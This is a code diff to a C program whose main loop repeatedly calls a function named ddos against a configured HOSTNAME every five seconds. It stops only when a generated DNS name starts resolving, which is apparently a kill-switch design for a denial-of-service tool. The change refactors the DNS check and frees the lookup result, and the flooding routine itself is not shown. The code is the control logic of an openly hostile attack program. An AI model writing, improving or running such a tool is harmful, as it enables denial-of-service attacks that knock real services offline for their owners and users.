@@ -174,20 +174,10 @@ void ddos(CURL *curl) {
 
 /// Check if a DNS entry exist
 /// \param entry DNS entry to check (char *)
-/// \param result DNS response address information (addrinfo *)
+/// \param dns_result DNS response address information (addrinfo **)
 /// \return True if the entry exists, false otherwise (bool)
-bool check(const char *entry) {
-    int result;
-    addrinfo *r;
-
-    result = getaddrinfo(entry, NULL, NULL, &r);
-
-    if (result == 0) {
-        freeaddrinfo(r);
-        return true;
-    } else {
-        return false;
-    }
+bool check(const char *entry, addrinfo **dns_result) {
+    return getaddrinfo(entry, NULL, NULL, dns_result) == 0;
 }
 
 int main(int argc, char *argv[]) {
@@ -204,15 +194,18 @@ int main(int argc, char *argv[]) {
 
     CURL *curl = get_curl(HOSTNAME);
 
+    addrinfo *dns_result;
+
     char dns[18];
     get_dns(dns);
 
-    while (!check(dns)) {
+    while (!check(dns, &dns_result)) {
         ddos(curl);
         sleep(5);
     }
 
     curl_easy_cleanup(curl);
+    freeaddrinfo(dns_result);
 
     return EXIT_SUCCESS;
 }
